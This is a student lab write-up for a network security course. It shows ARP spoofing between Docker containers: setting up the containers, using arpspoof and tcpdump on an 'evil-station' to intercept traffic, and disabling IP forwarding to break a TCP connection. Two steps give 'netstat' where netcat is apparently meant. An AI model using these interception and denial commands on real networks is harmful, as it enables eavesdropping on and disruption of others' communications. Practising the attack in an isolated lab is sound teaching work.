# Lab 1 - ARP Spoofing

### Environment setup

Setup the controlled environment in which the attack will be simulated.

1. Cloning the git repo and entering the directory: 
    
    `git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22)`
    
    `cd SRP-2021-22/arp-spoofing`
    
2. Starting docker containers:
    
    `./start.sh`
    
3. Enter docker container with an interactive terminal:
    
    `docker exec -it <container-name> bash`
    
4. Check if the network between containers is up
    
    `ping station-2` (from station-1)
    
5. Find IP and MAC addresses of each docker container:
    
    `ifconfig -a`
    
    **Station-1:**
    
    IP: `172.22.0.2`
    
    MAC: `02:42:ac:16:00:02`
    
    **Station-2:**
    
    IP: `172.22.0.4`
    
    MAC: `02:42:ac:16:00:04`
    
    **Evil-Station:**
    
    IP: `172.22.0.3`
    
    MAC: `02:42:ac:16:00:03`
    

### Emulating a 'real' situation

Emulation of a conversation between two computers, in our case containers on the same docker virtual network.

1. To open connection between **station-1** and **station-2**:
    
    On **station-2**: `netstat -l -p 8000`
    
    **station-2** behaves like a server listening for connections
    
    On **station-1**: `netstat station-2 8000`
    
    **station-1** behaves like a client requesting to connect to **station-2**
    

### Attack

In the controlled environment that was set up, emulate an attack.

1. Listen traffic on **eth0** (network on which all containers are connected on) on **evil-station**:
    
    `tcpdump`
    
2. Perform ARP spoofing:
    
    `arpspoof -t station-1 -r station-2`
    
3. To filter `tcpdump` output:
    
    `tcpdump -XA station-1 and not arp`
    
4. DOS between **station-1** and **station-2**:
    
    `echo 0 > /proc/sys/net/ipv4/ip_forward`
    
    Stop IP forwarding from **evil-station** to **station-2 â†’** results in messages not being forwared to **station-2,** also consequently TCP connection breaks down since **station-1** can't send ACK signal to **station-2**
